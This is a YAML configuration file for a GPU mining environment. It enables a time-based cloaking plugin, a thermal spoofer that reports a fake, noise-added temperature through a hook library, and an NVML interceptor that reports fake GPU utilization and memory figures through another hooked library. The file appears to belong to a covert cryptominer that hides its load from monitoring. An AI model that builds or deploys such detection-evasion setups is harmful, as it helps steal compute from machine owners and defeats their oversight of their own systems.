# GPU Plugins Configuration
plugins:
  time_based_cloaking:
    enabled: true
    work_ms: 800
    sleep_ms: 200
    
  thermal_spoofer:
    enabled: true
    fake_temperature: 50
    add_noise: true
    lib_path: /opt/hooks/libtempspoof.so
    
  nvml_interceptor:
    enabled: true
    fake_utilization: 20
    fake_memory_used: 100
    lib_path: /opt/hooks/libgpuhook.so
    

global:
  log_level: INFO
  enable_monitoring: true
  logs_dir: /app/mining_environment/logs